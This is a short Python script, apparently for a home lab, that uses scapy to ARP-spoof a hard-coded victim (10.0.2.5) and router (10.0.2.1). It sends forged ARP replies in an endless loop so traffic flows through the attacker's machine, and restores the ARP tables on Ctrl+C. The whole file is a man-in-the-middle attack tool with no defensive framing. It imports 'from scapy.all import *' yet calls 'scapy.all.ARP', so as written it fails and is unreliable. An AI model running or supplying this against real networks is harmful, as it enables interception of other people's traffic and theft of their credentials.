#!/usr/bin/env python3

from scapy.all import *
import time

victim_ip = "10.0.2.5"
router_ip = "10.0.2.1"


def get_mac(ip):
    arp_request = scapy.all.ARP(pdst=ip)
    broadcast = scapy.all.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    ans_list = scapy.all.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return ans_list[0][1].hwsrc


def arp_spoof(victim_ip, pretend_ip):
    packet = scapy.all.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip), psrc=pretend_ip)
    scapy.all.send(packet, verbose=False)


def restore_mac(victim_ip, router_ip):
    packet = scapy.all.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip), psrc=router_ip, hwsrc=get_mac(router_ip))
    scapy.all.send(packet, count=4, verbose=False)


try:
    count_packets = 0
    while True:
        arp_spoof(victim_ip, router_ip)
        arp_spoof(router_ip, victim_ip)
        count_packets += 2
        print("\r[+] Sent {} packets!".format(count_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore_mac(victim_ip, router_ip)
    restore_mac(router_ip, victim_ip)
    print("\n[+] Detected CTRL + C. Resting back to normal")
